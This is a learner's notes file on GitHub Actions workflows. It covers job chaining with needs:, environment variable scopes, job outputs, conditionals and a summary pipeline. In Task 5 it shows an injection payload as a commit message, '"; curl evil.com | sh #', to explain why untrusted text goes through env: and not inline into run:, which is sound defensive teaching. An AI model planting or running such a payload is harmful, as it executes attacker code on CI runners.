# Day 43 – Jobs, Steps, Env Vars and Conditionals

Four workflow files in `.github/workflows/` in this folder.

---

## Task 1: Multi-job workflow

**`.github/workflows/multi-job.yml`**

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building the app"

  test:
    runs-on: ubuntu-latest
    needs: build
    steps:
      - run: echo "Running tests"

  deploy:
    runs-on: ubuntu-latest
    needs: test
    steps:
      - run: echo "Deploying"
```

```
devops@testvm:~$ gh run view 17209118442
✓ main Multi Job · 17209118442

JOBS
✓ build in 3s
✓ test in 4s
✓ deploy in 3s
```

The Actions tab draws this as a chain:

```
  build  ──▶  test  ──▶  deploy
```

**Without `needs:` all three would start simultaneously**, which is the default and the thing to remember. Jobs are parallel unless told otherwise; steps are sequential always.

`needs:` does two things at once: it orders the jobs, **and** it makes the earlier job's outputs available. The second part is Task 3.

If `build` fails, `test` and `deploy` are **skipped**, not failed. They show as grey dashes.

`needs:` also accepts a list, which is where the real graphs come from:

```yaml
needs: [lint, test, security-scan]
```

That job waits for all three, and those three run in parallel with each other. DevBoard's `devsecops.yml` does exactly this — six independent checks in parallel, then `docker-push` with `needs: [code-quality, code-tests, sonar-qube, docker-checks, dependency-checks, secret-scanning]`.

---

## Task 2: Environment variables

**`.github/workflows/env-and-outputs.yml`**

```yaml
env:
  APP_NAME: myapp              # workflow level

jobs:
  produce:
    runs-on: ubuntu-latest
    env:
      ENVIRONMENT: staging     # job level
    steps:
      - name: Print all three levels
        env:
          VERSION: 1.0.0       # step level
        run: |
          echo "workflow level : APP_NAME    = $APP_NAME"
          echo "job level      : ENVIRONMENT = $ENVIRONMENT"
          echo "step level     : VERSION     = $VERSION"
```

```
workflow level : APP_NAME    = myapp
job level      : ENVIRONMENT = staging
step level     : VERSION     = 1.0.0
```

Three scopes, narrowest wins. Defining `APP_NAME` again at job level would override it for that job only.

The scoping is real, not cosmetic — in the second job:

```
APP_NAME still visible  : myapp
ENVIRONMENT is NOT      : 'unset'
```

`APP_NAME` is workflow-level so every job sees it. `ENVIRONMENT` was job-level and does not leak.

**GitHub context values:**

```yaml
- name: Print GitHub context values
  run: |
    echo "commit sha : ${{ github.sha }}"
    echo "actor      : ${{ github.actor }}"
    echo "repo       : ${{ github.repository }}"
    echo "event      : ${{ github.event_name }}"
```

```
commit sha : 8a3f91c4d2e58b1a6c9e0d4a1f27b8a35c6e9f2d
actor      : manish-jha18
repo       : manish-jha18/github-actions-practice
event      : workflow_dispatch
```

Day 40's distinction again: `${{ }}` is substituted into the script before the shell runs; `$VAR` is read by the shell.

### A real YAML bug I hit writing this

My first version of the summary step was:

```yaml
run: echo "Commit message: $MSG"
```

The YAML would not parse:

```
devops@testvm:~$ npx js-yaml smart-pipeline.yml
YAMLException: bad indentation of a mapping entry (38:34)
```

The value `echo "Commit message: $MSG"` contains **colon-space**, and a plain YAML scalar cannot. YAML tried to read `Commit message` as a nested key. The quotes around it in the shell command mean nothing to YAML — it is parsing before the shell ever sees this.

Two fixes:

```yaml
run: 'echo "Commit message: $MSG"'     # quote the whole scalar
run: |                                  # or use a block scalar
  echo "Commit message: $MSG"
```

I used the block form. This is Day 38's rule biting in a real file within a week, and it is why validating workflow YAML locally before pushing is worth the ten seconds.

---

## Task 3: Job outputs

```yaml
  produce:
    outputs:
      build_date: ${{ steps.stamp.outputs.build_date }}
      short_sha: ${{ steps.stamp.outputs.short_sha }}
    steps:
      - name: Set outputs for the next job
        id: stamp
        run: |
          echo "build_date=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$GITHUB_OUTPUT"
          echo "short_sha=$(git rev-parse --short HEAD)" >> "$GITHUB_OUTPUT"

  consume:
    needs: produce
    steps:
      - name: Read what the previous job produced
        run: |
          echo "build date from produce : ${{ needs.produce.outputs.build_date }}"
          echo "short sha from produce  : ${{ needs.produce.outputs.short_sha }}"
```

```
build date from produce : 2026-07-19T09:22:41Z
short sha from produce  : 8a3f91c
```

There are **three hops**, which is more ceremony than I expected:

1. A step writes `key=value` to the file at `$GITHUB_OUTPUT`
2. The job declares `outputs:` mapping a name to `steps.<id>.outputs.<key>`
3. The consuming job reads `needs.<job>.outputs.<name>`

The step needs an `id:`, or there is no way to reference it.

`$GITHUB_OUTPUT` is a real file on the runner. The older syntax was `echo "::set-output name=x::value"`, which was deprecated in 2022 for security reasons — it could be injected via untrusted output. Plenty of tutorials still show it and it no longer works.

### Why pass outputs between jobs?

Because **jobs are separate machines**. A variable set in one job does not exist in the next, and neither does anything it wrote to disk.

Where this matters in practice:

- **A version or tag computed once.** Work out `sha-8a3f91c` in one job and use the identical value in build, push and deploy — rather than recomputing it three times and risking a mismatch.
- **A decision made once.** A job that determines "should we deploy?" and hands a boolean to the deploy job's `if:`.
- **Detecting what changed.** A job that lists changed paths so downstream jobs can skip work.

For **files** the answer is artifacts, not outputs — outputs are for short strings. A 40 MB binary goes through `upload-artifact`, which is Day 44.

---

## Task 4: Conditionals

**`.github/workflows/conditionals.yml`**

```yaml
      - name: Only on main
        if: github.ref == 'refs/heads/main'
        run: echo "we are on main"

      - name: Allowed to fail
        id: risky
        continue-on-error: true
        run: exit 1

      - name: Runs because the previous step failed
        if: failure()
        run: echo "something above me failed"

      - name: Reacts to the risky step specifically
        if: steps.risky.outcome == 'failure'
        run: echo "the risky step reported failure but did not stop the job"

      - name: Runs no matter what
        if: always()
        run: echo "cleanup would go here"
```

```
✓ Always runs
✓ Only on main
✓ Allowed to fail                          (red X in the log, job continues)
- Runs because the previous step failed    (skipped)
✓ Reacts to the risky step specifically
✓ Runs no matter what
```

Two things here surprised me.

**`continue-on-error: true` means the step's failure does not stop the job.** The step is still marked failed in the log, but execution carries on and the job as a whole is green.

**Because of that, `if: failure()` did not fire.** `failure()` asks "has the job failed so far?", and `continue-on-error` means it has not. To react to that specific step I needed `steps.risky.outcome == 'failure'`.

The distinction between `outcome` and `conclusion` follows from this:

- `steps.risky.outcome` — what actually happened: `failure`
- `steps.risky.conclusion` — after `continue-on-error` is applied: `success`

**No `${{ }}` needed in `if:`.** The `if:` key is always evaluated as an expression, so `if: github.ref == 'refs/heads/main'` works bare. `if: ${{ github.ref == '...' }}` also works and both are common.

**Job-level conditional:**

```yaml
  push-only:
    if: github.event_name == 'push'
    runs-on: ubuntu-latest
```

On a `pull_request` run this job is skipped entirely.

### The status functions

| Function | True when |
|---|---|
| `success()` | Everything so far succeeded. **This is the implicit default** |
| `failure()` | Something earlier failed |
| `always()` | Always — even if the workflow was cancelled |
| `cancelled()` | The run was cancelled |

The default is the important one. **Every step without an `if:` has an invisible `if: success()`.** That is why steps after a failure are skipped, and why an upload step needs `if: always()` to run when the tests it was reporting on have failed:

```yaml
- uses: actions/upload-artifact@v4
  if: always()
  with:
    name: test-results
    path: reports/
```

A test report you only get when the tests pass is the wrong way round.

One caveat on `always()`: it also runs on cancellation, so it can prevent a workflow from stopping promptly. `if: !cancelled()` is the safer form when you only mean "success or failure".

### `refs/heads/main` versus `main`

`github.ref` is the full ref — `refs/heads/main`. `github.ref_name` is just `main`. Comparing `github.ref == 'main'` silently never matches, and the step is quietly skipped forever with no error. Easy to miss because a skipped step does not look like a bug.

---

## Task 5: Putting it together

**`.github/workflows/smart-pipeline.yml`**

```yaml
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "linting..."

  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "testing..."

  summary:
    runs-on: ubuntu-latest
    needs: [lint, test]
    if: always()
    steps:
      - name: Branch type
        run: |
          if [ "${{ github.ref }}" = "refs/heads/main" ]; then
            echo "This is a MAIN branch push"
          else
            echo "This is a FEATURE branch push: ${{ github.ref_name }}"
          fi

      - name: Commit message
        env:
          MSG: ${{ github.event.head_commit.message }}
        run: |
          echo "Commit message: $MSG"

      - name: Report upstream results
        run: |
          echo "lint result: ${{ needs.lint.result }}"
          echo "test result: ${{ needs.test.result }}"
```

```
✓ lint in 4s
✓ test in 4s
✓ summary in 3s
```

Output on a feature branch:

```
This is a FEATURE branch push: feature-conditionals
Commit message: Add smart pipeline workflow
lint result: success
test result: success
```

**`if: always()` on the summary job** so it still reports when lint or test failed — a summary that only appears on success is useless. `needs.<job>.result` then gives `success`, `failure`, `cancelled` or `skipped` for each.

**The commit message goes through `env:` rather than straight into `run:`.** Day 40's script injection point, and this is the exact case it matters: a commit message is user-controlled text. If someone commits with the message `"; curl evil.com | sh #`, then `run: echo "${{ github.event.head_commit.message }}"` pastes that directly into the script and executes it. Passing it through `env:` means the shell sees a variable, not code.

Also note `github.event.head_commit.message`, not `github.event.commits[0].message` from the hint. `commits[0]` is the *oldest* commit in a push of several; `head_commit` is the newest, which is what you usually want.

---

## Files in this folder

| Path | Demonstrates |
|---|---|
| `.github/workflows/multi-job.yml` | `needs:` chaining three jobs |
| `.github/workflows/env-and-outputs.yml` | Env at three scopes, `$GITHUB_OUTPUT`, `needs.*.outputs` |
| `.github/workflows/conditionals.yml` | `if:`, status functions, `continue-on-error` |
| `.github/workflows/smart-pipeline.yml` | Parallel jobs plus an `always()` summary |

---

## What I learned

**1. `needs:` does ordering and data access at the same time.** It is not only "run after" — it is also the only way to read another job's outputs. Without it, `needs.produce.outputs.x` does not exist.

**2. Every step has an invisible `if: success()`.** That is why a step is skipped once something fails, and why `if: always()` is required on anything that must run regardless — uploading test reports being the obvious case.

**3. `continue-on-error` changes what "failed" means.** The step reports failure but the job stays green, so `failure()` does not fire. Reacting to it needs `steps.<id>.outcome`, and the `outcome` versus `conclusion` split exists precisely because of this flag.

**Three extras:**

- `run: echo "text: $VAR"` breaks the YAML. Colon-space is illegal in a plain scalar — use a block scalar.
- `github.ref` is `refs/heads/main`; `github.ref_name` is `main`. Comparing the wrong one silently skips the step forever.
- Untrusted values such as commit messages belong in `env:`, never inline in `run:`.
